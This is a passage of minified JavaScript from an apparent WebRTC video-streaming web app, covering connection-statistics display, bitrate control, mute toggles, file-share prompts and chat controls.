title='direct p2p, but NAT firewall likely'>srflx</p>"):"local_ip_blocking"==key&&value?(value="âš ï¸ You're blocking",hint="no direct p2p connection made because of YOUR browser or system setting"):"remote_ip_blocking"==key&&value&&(value="âš ï¸ They're blocking",hint="no direct p2p connection made because of THEIR browser or system setting"),stat=stat.replaceAll("_"," "),menu.innerHTML+=hint?"<li style='cursor:help;' title='"+hint+"'><span>"+stat+"</span><span>"+value+unit+"</span></li>":"<li><span>"+stat+"</span><span>"+value+unit+"</span></li>"}})),UUID&&session.pcs[UUID]&&(session.pcs[UUID].maxBandwidth&&(menu.innerHTML+="<li><span>max bandwidth target</span><span>"+session.pcs[UUID].maxBandwidth+"</span></li>"),session.pcs[UUID].setBitrate&&(menu.innerHTML+='<li><span onclick=\'var bitr=prompt("Enter a target bitrate (kbps)");if (bitr!==null){session.limitBitrate("'+UUID+"\", parseInt(bitr));}'>init bitrate target</span><span>"+session.pcs[UUID].setBitrate+"</span></li>"),session.pcs[UUID].savedBitrate&&(menu.innerHTML+="<li><span>current bitrate target</span><span>"+session.pcs[UUID].savedBitrate+"</span></li>"),!1===session.room||session.pcs[UUID].whipout||"audio"===session.meshcast||(menu.innerHTML+="<li><span title='Only available if not in a group room'>adjust video bitrate</span><span><input class='thinSlider' title='Adjust the outbound bitrate for this stream.' type='range' value='"+(session.pcs[UUID].savedBitrate||session.pcs[UUID].setBitrate||2500)+"' min='0' max='"+(session.pcs[UUID].setBitrate||6e3)+"' onchange='session.limitBitrate(\""+UUID+"\", parseInt(this.value));' /></span></li>"))}}}function updateLocalStats(){if(session){var totalBitrate=0,totalBitrate2=0,cpuLimited=!1,totalVideo=0,totalAudio=0,totalScenes=0,meshcastActive=!1,nackRate=0,totalStreams=0,miscSenders=[];for(var uuid in session.whipOut&&session.whipOut.getSenders&&session.whipOut.stats&&miscSenders.push(session.whipOut),miscSenders.forEach((data=>{try{data.getSenders().forEach((sender=>{(sender.track&&"video"==sender.track.kind&&sender.track.enabled||sender.track&&"audio"==sender.track.kind&&sender.track.enabled&&!session.muted)&&(meshcastActive=!0)})),"video_bitrate_kbps"in data.stats&&(totalBitrate+=data.stats.video_bitrate_kbps||0),"audio_bitrate_kbps"in data.stats&&(totalBitrate+=data.stats.audio_bitrate_kbps||0),"total_sending_bitrate_kbps"in data.stats&&(totalBitrate2+=data.stats.total_sending_bitrate_kbps||0),"quality_limitation_reason"in data.stats&&"cpu"==data.stats.quality_limitation_reason&&(cpuLimited=!0),"nacks_per_second"in data.stats&&(nackRate+=data.stats.nacks_per_second,totalStreams+=1),setTimeout((function(data){data&&data.getStats().then((function(stats){"audio_bitrate_kbps"in data.stats&&(data.stats.audio_bitrate_kbps=0);var candidate,nominatedCandidate=!1,candidates={},ipleakingAllowedRemote=!1,ipleakingAllowedLocal=!1;if((stats.forEach((stat=>{if(!stat.id||!stat.id.startsWith("DEPRECATED_"))if("transport"==stat.type)"bytesSent"in stat&&("_bytesSent"in data.stats&&data.stats._timestamp&&stat.timestamp&&(data.stats.total_sending_bitrate_kbps=parseInt(8*(stat.bytesSent-data.stats._bytesSent)/(stat.timestamp-data.stats._timestamp))),data.stats._bytesSent=stat.bytesSent),"timestamp"in stat&&(data.stats._timestamp=stat.timestamp);else if("outbound-rtp"==stat.type)if("video"==stat.kind){if("framesPerSecond"in stat)data.stats.resolution=stat.frameWidth+" x "+stat.frameHeight+" @ "+stat.framesPerSecond;else if("frameHeight"in stat)if("framesEncoded"in stat&&stat.timestamp){var lastFramesEncoded=0,lastTimestamp=0;try{lastFramesEncoded=data.stats._framesEncoded,lastTimestamp=data.stats._timestamp}catch(e){}data.stats._FPS=parseInt(10*(stat.framesEncoded-lastFramesEncoded)/(stat.timestamp/1e3-lastTimestamp))/10||"?",data.stats._framesEncoded=stat.framesEncoded,data.stats._timestamp=stat.timestamp/1e3,data.stats.resolution=stat.frameWidth+" x "+stat.frameHeight+" @ "+data.stats._FPS}else data.stats.resolution=stat.frameWidth+" x "+stat.frameHeight;if("encoderImplementation"in stat&&(data.stats.video_encoder=stat.encoderImplementation,"ExternalEncoder"==stat.encoderImplementation||"MediaFoundationVideoEncodeAccelerator"==stat.encoderImplementation?(data.stats._hardwareEncoder=!0,data.encoder=!0):data.encoder=!1),"qualityLimitationReason"in stat){if(data.stats.quality_limitation_reason&&data.stats.quality_limitation_reason!==stat.qualityLimitationReason)try{var miniInfo={};miniInfo.qlr=stat.qualityLimitationReason,"_hardwareEncoder"in data.stats?miniInfo.hw_enc=data.stats._hardwareEncoder:miniInfo.hw_enc=null,session.sendMessage({miniInfo:miniInfo})}catch(e){warnlog(e)}data.stats.quality_limitation_reason=stat.qualityLimitationReason}"bytesSent"in stat&&("_bytesSentVideo"in data.stats&&data.stats._timestamp1&&(data.stats.video_bitrate_kbps=parseInt(8*(stat.bytesSent-data.stats._bytesSentVideo)/(stat.timestamp-data.stats._timestamp1)),stat.timestamp),data.stats._bytesSentVideo=stat.bytesSent),"nackCount"in stat&&"_nackCount"in data.stats&&data.stats._timestamp1&&stat.timestamp&&(data.stats.nacks_per_second=parseInt(1e4*(stat.nackCount-data.stats._nackCount)/(stat.timestamp-data.stats._timestamp1))/10),"retransmittedBytesSent"in stat&&"_retransmittedBytesSent"in data.stats&&data.stats._timestamp1&&stat.timestamp&&(data.stats.retransmitted_kbps=parseInt(8*(stat.retransmittedBytesSent-data.stats._retransmittedBytesSent)/(stat.timestamp-data.stats._timestamp1))),"nackCount"in stat&&(data.stats._nackCount=stat.nackCount),"retransmittedBytesSent"in stat&&(data.stats._retransmittedBytesSent=stat.retransmittedBytesSent),"timestamp"in stat&&(data.stats._timestamp1=stat.timestamp),"pliCount"in stat&&(data.stats.total_pli_count=stat.pliCount),"keyFramesEncoded"in stat&&(data.stats.total_key_frames_encoded=stat.keyFramesEncoded)}else"audio"==stat.kind&&("bytesSent"in stat&&data.stats._bytesSentAudio&&data.stats._timestamp2&&stat.timestamp&&("audio_bitrate_kbps"in data.stats?data.stats.audio_bitrate_kbps+=parseInt(8*(stat.bytesSent-data.stats._bytesSentAudio)/(stat.timestamp-data.stats._timestamp2)):data.stats.audio_bitrate_kbps=0),"timestamp"in stat&&(data.stats._timestamp2=stat.timestamp),"bytesSent"in stat&&(data.stats._bytesSentAudio=stat.bytesSent));else"remote-candidate"==stat.type?(candidates[stat.id]=stat,"relay"!=stat.candidateType&&(ipleakingAllowedRemote=!0)):"local-candidate"==stat.type?(candidates[stat.id]=stat,"relay"!=stat.candidateType&&(ipleakingAllowedLocal=!0)):"candidate-pair"==stat.type&&stat.nominated?nominatedCandidate?nominatedCandidate.priority<stat.priority&&(nominatedCandidate=stat):nominatedCandidate=stat:"mimeType"in stat&&"type"in stat&&"codec"==stat.type&&(stat.mimeType.includes("video")?data.stats.video_codec=stat.mimeType.split("video/")[1]:stat.mimeType.includes("audio")&&(data.stats.audio_codec=stat.mimeType.split("audio/")[1],stat.clockRate?(data.stats.audio_clockRate=stat.clockRate,stat.channels&&(data.stats.audio_clockRate+=" / "+stat.channels)):stat.sdpFmtpLine&&(data.stats.fmtp=stat.sdpFmtpLine)))})),nominatedCandidate&&("availableOutgoingBitrate"in nominatedCandidate&&(data.stats.available_outgoing_bitrate_kbps=parseInt(nominatedCandidate.availableOutgoingBitrate/1024),!1!==session.maxBandwidth&&session.limitMaxBandwidth(data.stats.available_outgoing_bitrate_kbps,session.pcs[UUID],!1)),"totalRoundTripTime"in nominatedCandidate&&"responsesReceived"in nominatedCandidate&&(data.stats.average_roundTripTime_ms=parseInt(nominatedCandidate.totalRoundTripTime/nominatedCandidate.responsesReceived*1e3))),nominatedCandidate&&nominatedCandidate.remoteCandidateId)&&(candidates[nominatedCandidate.remoteCandidateId]&&"candidateType"in(candidate=candidates[nominatedCandidate.remoteCandidateId])))if(data.stats.candidateType_remote=candidate.candidateType,"relay"===candidate.candidateType)"ip"in candidate&&(data.stats.remote_relay_IP=candidate.ip),"relayProtocol"in candidate&&(data.stats.remote_relay_protocol=candidate.relayProtocol),data.stats.remote_ip_blocking=!ipleakingAllowedRemote;else try{delete data.stats.remote_relay_IP,delete data.stats.remote_relay_protocol,delete data.stats.remote_ip_blocking}catch(e){}if(nominatedCandidate&&nominatedCandidate.localCandidateId&&(candidates[nominatedCandidate.localCandidateId]&&"candidateType"in(candidate=candidates[nominatedCandidate.localCandidateId])))if(data.stats.candidateType_local=candidate.candidateType,"relay"===candidate.candidateType)"ip"in candidate&&(data.stats.local_relay_IP=candidate.ip),"relayProtocol"in candidate&&(data.stats.local_relay_protocol=candidate.relayProtocol),data.stats.local_ip_blocking=!ipleakingAllowedLocal;else try{delete data.stats.local_relay_IP,delete data.stats.local_relay_protocol,delete data.stats.local_ip_blocking}catch(e){}}))}),0,data)}catch(e){errorlog(e)}})),session.pcs)if(session.pcs[uuid].stats){var atot=0;getSenders2(uuid).forEach((sender=>{sender.track&&"video"==sender.track.kind&&sender.track.enabled?totalVideo+=1:sender.track&&"audio"==sender.track.kind&&sender.track.enabled&&!session.muted&&(atot=1)})),totalAudio+=atot,"scene"in session.pcs[uuid]&&!1!==session.pcs[uuid].scene&&(totalScenes+=1),"video_bitrate_kbps"in session.pcs[uuid].stats&&(totalBitrate+=session.pcs[uuid].stats.video_bitrate_kbps||0),"audio_bitrate_kbps"in session.pcs[uuid].stats&&(totalBitrate+=session.pcs[uuid].stats.audio_bitrate_kbps||0),"total_sending_bitrate_kbps"in session.pcs[uuid].stats&&(totalBitrate2+=session.pcs[uuid].stats.total_sending_bitrate_kbps||0),"quality_limitation_reason"in session.pcs[uuid].stats&&"cpu"==session.pcs[uuid].stats.quality_limitation_reason&&(cpuLimited=!0),"nacks_per_second"in session.pcs[uuid].stats&&(nackRate+=session.pcs[uuid].stats.nacks_per_second,totalStreams+=1),uuid in session.rpcs&&(session.pcs[uuid].stats.label&&(session.pcs[uuid].stats.label=session.rpcs[uuid].label),session.pcs[uuid].stats.streamID&&(session.pcs[uuid].stats.streamID=session.rpcs[uuid].streamID));var screenTracksIds=[];!1!==session.screenStream&&session.screenStream.getTracks().forEach((trk=>{screenTracksIds.push(trk.id)})),setTimeout((function(UUID){if(session.pcs[UUID]){if(session.pcs[UUID].realUUID&&session.pcs[session.pcs[UUID].realUUID])var thisIsAlt=!0,node=session.pcs[session.pcs[UUID].realUUID];else thisIsAlt=!1,node=session.pcs[UUID];node.getStats().then((function(stats){if(UUID in session.pcs){"audio_bitrate_kbps"in session.pcs[UUID].stats&&(session.pcs[UUID].stats.audio_bitrate_kbps=0);var candidate,nominatedCandidate=!1,candidates={},ipleakingAllowedRemote=!1,ipleakingAllowedLocal=!1,statObject=[],altStreamList={};if(stats.forEach((stat=>{statObject.push(stat),screenTracksIds.includes(stat.trackIdentifier)&&(altStreamList[stat.id]=stat.trackIdentifier)})),statObject.forEach((stat=>{if(!stat.id||!stat.id.startsWith("DEPRECATED_"))if("transport"==stat.type)"bytesSent"in stat&&("_bytesSent"in session.pcs[UUID].stats&&session.pcs[UUID].stats._timestamp3&&stat.timestamp&&(session.pcs[UUID].stats.total_sending_bitrate_kbps=parseInt(8*(stat.bytesSent-session.pcs[UUID].stats._bytesSent)/(stat.timestamp-session.pcs[UUID].stats._timestamp3))),session.pcs[UUID].stats._bytesSent=stat.bytesSent),"timestamp"in stat&&(session.pcs[UUID].stats._timestamp3=stat.timestamp);else if("outbound-rtp"==stat.type){if(thisIsAlt&&stat.mediaSourceId&&!altStreamList[stat.mediaSourceId])return;if(!thisIsAlt&&stat.mediaSourceId&&altStreamList[stat.mediaSourceId])return;if("video"==stat.kind){if("framesPerSecond"in stat)session.pcs[UUID].stats.resolution=stat.frameWidth+" x "+stat.frameHeight+" @ "+stat.framesPerSecond;else if("frameHeight"in stat)if("framesEncoded"in stat&&stat.timestamp){var lastFramesEncoded=0,lastTimestamp=0;try{lastFramesEncoded=session.pcs[UUID].stats._framesEncoded,lastTimestamp=session.pcs[UUID].stats._timestamp}catch(e){}session.pcs[UUID].stats._FPS=parseInt(10*(stat.framesEncoded-lastFramesEncoded)/(stat.timestamp-lastTimestamp))/10,session.pcs[UUID].stats._framesEncoded=stat.framesEncoded,session.pcs[UUID].stats._timestamp=stat.timestamp,session.pcs[UUID].stats.resolution=stat.frameWidth+" x "+stat.frameHeight+" @ "+session.pcs[UUID].stats._FPS}else session.pcs[UUID].stats.resolution=stat.frameWidth+" x "+stat.frameHeight;var miniInfo={},sendMini=!1;if("encoderImplementation"in stat&&(session.pcs[UUID].stats.video_encoder=stat.encoderImplementation,"ExternalEncoder"==stat.encoderImplementation||"MediaFoundationVideoEncodeAccelerator"==stat.encoderImplementation?(session.pcs[UUID].stats._hardwareEncoder=!0,!0!==session.pcs[UUID].encoder&&(session.pcs[UUID].encoder=!0,miniInfo.hw_enc=!0,sendMini=!0)):!0===session.pcs[UUID].encoder&&(session.pcs[UUID].encoder=!1,miniInfo.hw_enc=!1,sendMini=!0)),"qualityLimitationReason"in stat){if(session.pcs[UUID].stats.quality_limitation_reason&&session.pcs[UUID].stats.quality_limitation_reason!==stat.qualityLimitationReason)try{sendMini=!0,miniInfo.qlr=stat.qualityLimitationReason}catch(e){warnlog(e)}session.pcs[UUID].stats.quality_limitation_reason=stat.qualityLimitationReason}sendMini&&session.sendMessage({miniInfo:miniInfo},UUID),"bytesSent"in stat&&("_bytesSentVideo"in session.pcs[UUID].stats&&session.pcs[UUID].stats._timestamp1&&stat.timestamp&&(session.pcs[UUID].stats.video_bitrate_kbps=parseInt(8*(stat.bytesSent-session.pcs[UUID].stats._bytesSentVideo)/(stat.timestamp-session.pcs[UUID].stats._timestamp1))),session.pcs[UUID].stats._bytesSentVideo=stat.bytesSent),"nackCount"in stat&&"_nackCount"in session.pcs[UUID].stats&&session.pcs[UUID].stats._timestamp1&&stat.timestamp&&(session.pcs[UUID].stats.nacks_per_second=parseInt(1e4*(stat.nackCount-session.pcs[UUID].stats._nackCount)/(stat.timestamp-session.pcs[UUID].stats._timestamp1))/10),"retransmittedBytesSent"in stat&&"_retransmittedBytesSent"in session.pcs[UUID].stats&&session.pcs[UUID].stats._timestamp1&&stat.timestamp&&(session.pcs[UUID].stats.retransmitted_kbps=parseInt(8*(stat.retransmittedBytesSent-session.pcs[UUID].stats._retransmittedBytesSent)/(stat.timestamp-session.pcs[UUID].stats._timestamp1))),"nackCount"in stat&&(session.pcs[UUID].stats._nackCount=stat.nackCount),"retransmittedBytesSent"in stat&&(session.pcs[UUID].stats._retransmittedBytesSent=stat.retransmittedBytesSent),"timestamp"in stat&&(session.pcs[UUID].stats._timestamp1=stat.timestamp),"pliCount"in stat&&(session.pcs[UUID].stats.total_pli_count=stat.pliCount),"keyFramesEncoded"in stat&&(session.pcs[UUID].stats.total_key_frames_encoded=stat.keyFramesEncoded)}else"audio"==stat.kind&&("bytesSent"in stat&&session.pcs[UUID].stats._bytesSentAudio&&session.pcs[UUID].stats._timestamp2&&stat.timestamp&&("audio_bitrate_kbps"in session.pcs[UUID].stats?session.pcs[UUID].stats.audio_bitrate_kbps+=parseInt(8*(stat.bytesSent-session.pcs[UUID].stats._bytesSentAudio)/(stat.timestamp-session.pcs[UUID].stats._timestamp2)):session.pcs[UUID].stats.audio_bitrate_kbps=0),"timestamp"in stat&&(session.pcs[UUID].stats._timestamp2=stat.timestamp),"bytesSent"in stat&&(session.pcs[UUID].stats._bytesSentAudio=stat.bytesSent))}else"remote-candidate"==stat.type?(candidates[stat.id]=stat,"relay"!=stat.candidateType&&(ipleakingAllowedRemote=!0)):"local-candidate"==stat.type?(candidates[stat.id]=stat,"relay"!=stat.candidateType&&(ipleakingAllowedLocal=!0)):"candidate-pair"==stat.type&&stat.nominated?nominatedCandidate?nominatedCandidate.priority<stat.priority&&(nominatedCandidate=stat):nominatedCandidate=stat:"mimeType"in stat&&"type"in stat&&"codec"==stat.type&&(stat.mimeType.includes("video")?session.pcs[UUID].stats.video_codec=stat.mimeType.split("video/")[1]:stat.mimeType.includes("audio")&&(session.pcs[UUID].stats.audio_codec=stat.mimeType.split("audio/")[1],stat.clockRate?(session.pcs[UUID].stats.audio_clockRate=stat.clockRate,stat.channels&&(session.pcs[UUID].stats.audio_clockRate+=" / "+stat.channels)):stat.sdpFmtpLine&&(session.pcs[UUID].stats.fmtp=stat.sdpFmtpLine)))})),nominatedCandidate&&("availableOutgoingBitrate"in nominatedCandidate&&(session.pcs[UUID].stats.available_outgoing_bitrate_kbps=parseInt(nominatedCandidate.availableOutgoingBitrate/1024),!1!==session.maxBandwidth&&session.limitMaxBandwidth(session.pcs[UUID].stats.available_outgoing_bitrate_kbps,session.pcs[UUID],!1)),"totalRoundTripTime"in nominatedCandidate&&"responsesReceived"in nominatedCandidate&&(session.pcs[UUID].stats.average_roundTripTime_ms=parseInt(nominatedCandidate.totalRoundTripTime/nominatedCandidate.responsesReceived*1e3))),nominatedCandidate&&nominatedCandidate.remoteCandidateId)if(candidates[nominatedCandidate.remoteCandidateId])if("candidateType"in(candidate=candidates[nominatedCandidate.remoteCandidateId]))if(session.pcs[UUID].stats.candidateType_remote=candidate.candidateType,"relay"===candidate.candidateType)"ip"in candidate&&(session.pcs[UUID].stats.remote_relay_IP=candidate.ip),"relayProtocol"in candidate&&(session.pcs[UUID].stats.remote_relay_protocol=candidate.relayProtocol),session.pcs[UUID].stats.remote_ip_blocking=!ipleakingAllowedRemote;else try{delete session.pcs[UUID].stats.remote_relay_IP,delete session.pcs[UUID].stats.remote_relay_protocol,delete session.pcs[UUID].stats.remote_ip_blocking}catch(e){}if(nominatedCandidate&&nominatedCandidate.localCandidateId)if(candidates[nominatedCandidate.localCandidateId])if("candidateType"in(candidate=candidates[nominatedCandidate.localCandidateId]))if(session.pcs[UUID].stats.candidateType_local=candidate.candidateType,"relay"===candidate.candidateType)"ip"in candidate&&(session.pcs[UUID].stats.local_relay_IP=candidate.ip),"relayProtocol"in candidate&&(session.pcs[UUID].stats.local_relay_protocol=candidate.relayProtocol),session.pcs[UUID].stats.local_ip_blocking=!ipleakingAllowedLocal;else try{delete session.pcs[UUID].stats.local_relay_IP,delete session.pcs[UUID].stats.local_relay_protocol,delete session.pcs[UUID].stats.local_ip_blocking}catch(e){}}}))}}),0,uuid)}try{var totalCon=Object.keys(session.pcs).length||0,headerStats="<span title='Number of outbound connections'>ğŸ”— ";headerStats+=totalCon,meshcastActive?(totalAudio&&(headerStats+="</span>, <span title='Number of outbound audio streams'>ğŸ‘‚ "+totalAudio),totalVideo&&(headerStats+="</span>, <span title='Number of outbound video streams'>ğŸ‘€ "+totalVideo),headerStats+="</span>, <span title='Publishing to a Meshcast broadcasting server''>ğŸ“¡Broadcast"):(headerStats+="</span>, <span title='Number of outbound audio streams'>ğŸ‘‚ "+totalAudio,headerStats+="</span>, <span title='Number of outbound video streams'>ğŸ‘€ "+totalVideo),session.roomid&&(headerStats+="</span>, <span title='Number of scenes.'>ğŸ¬ "+totalScenes+"</span>");var changed=!1;session.info.out?(session.info.out.a!==totalAudio&&(session.info.out.a=totalAudio),session.info.out.v!==totalVideo&&(session.info.out.v=totalAudio),session.info.out.c!==totalCon&&(session.info.out.c&&(changed=!0),session.info.out.c=totalCon),session.info.out.s!==totalScenes&&(session.info.out.s&&(changed=!0),session.info.out.s=totalScenes)):(session.info.out={},session.info.out.v=totalVideo,session.info.out.a=totalAudio,session.info.out.c=totalCon,session.info.out.s=totalScenes,changed=!0)}catch(e){}var uploadQuality=nackRate/totalStreams||0;uploadQuality=0===totalStreams?"title='Connection seems good' style='color: transparent; text-shadow: 0 0 0 #4d9bff;'":0===uploadQuality?"title='Connection seems good' style='color: transparent; text-shadow: 0 0 0 #0F0;'":uploadQuality<=1?"title='Mild connection issues' style='color: transparent; text-shadow: 0 0 0 yellow;'":uploadQuality<=5?"title='Moderate connection issues' style='color: transparent; text-shadow: 0 0 0 orange;'":"title='Severe connection issues' style='color: transparent; text-shadow: 0 0 0 #F00;'",Firefox&&0===totalBitrate&&0===totalBitrate2||(headerStats+=totalBitrate>totalBitrate2?", <span title='Video+Audio upload bitrate'><span "+uploadQuality+">ğŸ”º</span> "+Math.round(totalBitrate/10.24)/100+"<small>-mbps</small></span>":totalBitrate2>1e3?", <span title='Total upload bitrate' <span "+uploadQuality+">ğŸ”º</span> "+Math.round(totalBitrate2/10.24)/100+"<small>-mbps</small></span>":", <span title='Total upload bitrate' <span "+uploadQuality+">ğŸ”º</span> "+totalBitrate2+"<small>-kbps</small></span>"),!session.director&&session.roomid||cpuLimited&&(headerStats+=", <span style='color: #e69a0f;' title='Your CPU is maxed out; this can cause audio, sync, and quality issues.'>ğŸ”¥ CPU Overloaded</span>");var miniInfo={};if(changed&&(miniInfo.out={},miniInfo.out.c=session.info.out.c),session.cpuLimited!==cpuLimited&&(session.cpuLimited=cpuLimited,miniInfo.cpu=cpuLimited,changed=!0),changed)for(var uuid in session.pcs)session.sendMessage({miniInfo:miniInfo},uuid);if(document.getElementById("head5")){try{Object.keys(session.pcs).length&&document.getElementById("head5").classList.remove("hidden")}catch(e){}document.getElementById("head5").innerHTML=headerStats,document.getElementById("head5").onclick=function(){var[menu,innerMenu]=statsMenuCreator();menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu),printMyStats(innerMenu)}}}}function updateStats(obsvc=!1){if(document.getElementById("previewWebcam"))var ele=document.getElementById("previewWebcam"),wcs="webcamstats";else{if(!document.getElementById("videosource"))return;ele=document.getElementById("videosource"),wcs="webcamstats3"}try{getById(wcs).innerHTML="",ele.srcObject.getVideoTracks().forEach((function(track){if(obsvc&&30==parseInt(track.getSettings().frameRate))getById(wcs).innerHTML="Video Settings: "+(track.getSettings().width||0)+"x"+(track.getSettings().height||0)+" @ up to 60fps";else{var frameRateFPS=track.getSettings().frameRate;getById(wcs).innerHTML=frameRateFPS?"Current Video Settings: "+(track.getSettings().width||0)+"x"+(track.getSettings().height||0)+"@"+parseInt(100*frameRateFPS)/100+"fps":"Current Video Settings: "+(track.getSettings().width||0)+"x"+(track.getSettings().height||0)}}))}catch(e){errorlog(e)}}function toggleControlBar(){getById("controlButtons").classList.contains("hidden")?getById("controlButtons").dataset.enabled&&(getById("controlButtons").classList.remove("hidden"),delete getById("controlButtons").dataset.enabled):(getById("controlButtons").dataset.enabled=!0,getById("controlButtons").classList.add("hidden"))}function toggleMute(apply=!1,event=!1){var mouseUp=null,touchEnd=null,timeStart=Date.now();if(event&&(mouseUp=document.onmouseup,touchEnd=document.ontouchend,document.onmouseup=function(){document.onmouseup=mouseUp,document.ontouchend=touchEnd,Date.now()-timeStart<500||toggleMute()},document.ontouchend=function(){document.onmouseup=mouseUp,document.ontouchend=touchEnd,Date.now()-timeStart<300||toggleMute()}),!session.director||session.directorEnabledPPT){apply&&(session.muted=!session.muted),0==session.muted?(session.muted=!0,getById("mutetoggle").className="las la-microphone-slash toggleSize",session.cleanOutput||(getById("mutebutton").classList.add("red","pulsate"),getById("mutebutton").ariaPressed="true",getById("header").classList.add("red"),session.localMuteElement&&(session.localMuteElement.style.display="block")),session.streamSrc&&session.streamSrc.getAudioTracks().forEach((track=>{track.enabled=!1})),(iOS||iPad)&&session.videoElement&&session.videoElement.srcObject&&session.videoElement.srcObject.getAudioTracks().forEach((track=>{track.enabled=!1}))):(session.muted=!1,getById("mutetoggle").className="las la-microphone toggleSize",session.cleanOutput||(getById("mutebutton").classList.remove("red","pulsate"),getById("mutebutton").ariaPressed="false",getById("header").classList.remove("red"),session.localMuteElement&&(session.localMuteElement.style.display="none")),session.streamSrc&&session.streamSrc.getAudioTracks().forEach((track=>{track.enabled=!0})),(iOS||iPad)&&session.videoElement&&session.videoElement.srcObject&&session.videoElement.srcObject.getAudioTracks().forEach((track=>{track.enabled=!0})));try{postMessageIframe(document.getElementById("screensharesource"),{mic:!session.muted})}catch(e){}apply||(data={},data.muteState=session.muted,session.sendMessage(data),log("SEND MUTE STATE TO PEERS"),pokeIframeAPI("mic-mute-state",session.muted),pokeAPI("muted",session.muted))}else log("Director doesn't have PPT enabled yet")}function postMessageIframe(iFrameEle,message){if(iFrameEle&&"IFRAME"==iFrameEle.nodeName)try{iFrameEle.id&&document.getElementById(iFrameEle.id)?document.getElementById(iFrameEle.id).contentWindow.postMessage(message,"*"):iFrameEle.contentWindow.postMessage(message,"*")}catch(e){errorlog(e)}}function toggleSpeakerMute(apply=!1){if(CtrlPressed&&resetupAudioOut(),apply&&(session.speakerMuted=!session.speakerMuted),0==session.speakerMuted){session.speakerMuted=!0,getById("mutespeakertoggle").className="las la-volume-mute toggleSize",session.cleanOutput||(getById("mutespeakerbutton").className="float red");var sounds=document.getElementsByTagName("video");if(iOS||iPad)for(var i=0;i<sounds.length;++i)"keepAlivePlayer"!==sounds[i].id&&(sounds[i].muted=!sounds[i].muted,sounds[i].muted=session.speakerMuted);else for(i=0;i<sounds.length;++i)"keepAlivePlayer"!==sounds[i].id&&(sounds[i].muted=session.speakerMuted)}else{session.speakerMuted=!1,getById("mutespeakertoggle").className="las la-volume-up toggleSize",session.cleanOutput||(getById("mutespeakerbutton").className="float");sounds=document.getElementsByTagName("video");if(iOS||iPad)for(i=0;i<sounds.length;++i)sounds[i].muted=!sounds[i].muted,"videosource"!==sounds[i].id&&"previewWebcam"!==sounds[i].id&&"screensharesource"!==sounds[i].id&&"screenshare"!==sounds[i].id?sounds[i].muted=session.speakerMuted:sounds[i].muted=!0;else for(i=0;i<sounds.length;++i)"videosource"!==sounds[i].id&&"screensharesource"!==sounds[i].id&&"previewWebcam"!==sounds[i].id&&"screenshare"!==sounds[i].id&&(sounds[i].muted=session.speakerMuted)}for(var UUID in session.rpcs)applyMuteState(UUID),postMessageIframe(session.rpcs[UUID].iframeEle,{mute:session.speakerMuted});pokeIframeAPI("audio-mute-state",session.speakerMuted),apply||pokeAPI("speakerMuted",session.speakerMuted),(iOS||iPad)&&resetupAudioOut()}function toggleFileshare(UUID=!1,event=null){if(!1===UUID)var string='Share a file with the group<br /><input id="fileselector3" onchange="session.shareFile(this, false, event);" type="file" title="Transfer any file to the group"/><div id="activeShares"></div>';else if(session.directorList.indexOf(UUID)>=0)string='The director requested you share a file with them.<br /><input id="fileselector3" onchange="session.shareFile(this, `'+UUID+'`, event);" type="file" title="Transfer a file to the director"/><div id="activeShares"></div>';else string='Someone has requested you share a file with them.<br /><input id="fileselector3" onchange="session.shareFile(this, `'+UUID+'`, event);" type="file" title="Transfer a file to person"/><div id="activeShares"></div>';if(warnUser(string,!1,!1),session.hostedFiles){session.hostedFiles.length&&(getById("activeShares").innerHTML+="<div><u>Files being shared:</u></div>");for(var i=0;i<session.hostedFiles.length;i++)getById("activeShares").innerHTML+="<div><b>"+session.hostedFiles[i].name+"</b> ("+Math.ceil(session.hostedFiles[i].size/104857.6)/10+"-MB)</div>"}session.hostedTransfers&&(getById("activeShares").innerHTML+="<div><i>"+session.hostedTransfers.length+" file transfers in progress.</i></div>")}function toggleChat(event=null){0==session.chat?(setTimeout((function(){document.addEventListener("click",toggleChat)}),10),getById("chatModule").addEventListener("click",(function(e){return e.stopPropagation(),!1})),session.chat=!0,getById("chattoggle").className="las la-comment-dots toggleSize",getById("chatModule").classList.remove("hidden"),getById("chatInput").focus()):(session.chat=!1,getById("chattoggle").className="las la-comment-alt toggleSize",getById("chatModule").classList.add("hidden"),document.removeEventListener("click",toggleChat),getById("chatModule").removeEventListener("click",(function(e){return e.stopPropagation(),!1}))),getById("chatNotification").value&&(getById("chatNotification").value=0),getById("chatNotification").classList.remove("notification","red")}function directorAdvanced(ele){var target=document.createElement("div");target.style="position:absolute;float:left;width:270px;height:222px;background-color:#7E7E7E;";var closeButton=document.createElement("button");closeButton.innerHTML="<i class='las la-times'></i> close",closeButton.style.left="5px",closeButton.style.position="relative",closeButton.onclick=function(){target.parentNode.removeChild(target)},target.appendChild(closeButton);var someButton=document.createElement("button");someButton.innerHTML="<i class='las la-reply'></i> some action ",someButton.style.left="5px",someButton.style.position="relative",someButton.onclick=function(){session.sendRequest({},ele.dataset.UUID)},target.appendChild(someButton),ele.parentNode.appendChild(target)}function directorSendMessage(ele){var UUID=ele.dataset.UUID,target=document.querySelector("[data--u-u-i-d='"+UUID+"'][data-action-type='messaging-box']");if(target){if(!target.classList.contains("hidden"))return target.classList.add("hidden"),ele.classList.remove("pressed"),void(ele.ariaPressed="false");target.classList.remove("hidden"),ele.classList.add("pressed"),ele.ariaPressed="true";var inputField=target.querySelector("[data-action-type='messaging-box-text']");if(inputField&&(inputField.focus(),inputField.select()),!("overlay"in target)){target.overlay=!0,inputField&&inputField.addEventListener("keydown",(function(e){13==e.keyCode?(e.preventDefault(),sendButton.click()):27==e.keyCode&&(e.preventDefault(),inputField.value="",target.parentNode.removeChild(target))}));var sendButton=target.querySelector("[data-action-type='messaging-box-send']");sendButton&&(sendButton.onclick=function(){var chatMsg={};chatMsg.chat=inputField.value,sendButton.parentNode.overlay&&(chatMsg.overlay=sendButton.parentNode.overlay),session.sendRequest(chatMsg,ele.dataset.UUID),inputField.value=""});var closeButton=target.querySelector("[data-action-type='messaging-box-close']");closeButton&&(closeButton.onclick=function(){inputField.value="",target.classList.add("hidden"),ele.classList.remove("pressed"),ele.ariaPressed="false"});var overlayMsg=target.querySelector("[data-action-type='messaging-box-toggle']");overlayMsg&&(overlayMsg.onclick=function(e){log(e.target.parentNode.parentNode),!0===e.target.parentNode.parentNode.overlay?(e.target.parentNode.parentNode.overlay=!1,e.target.parentNode.innerHTML="<i class='las la-bell-slash' style='font-size:170%; color:#DDD; cursor:pointer;'></i>"):(e.target.parentNode.parentNode.overlay=!0,e.target.parentNode.innerHTML="<i class='las la-bell' style='font-size:170%; color:#FFF; cursor:pointer;'></i>")})}}}function 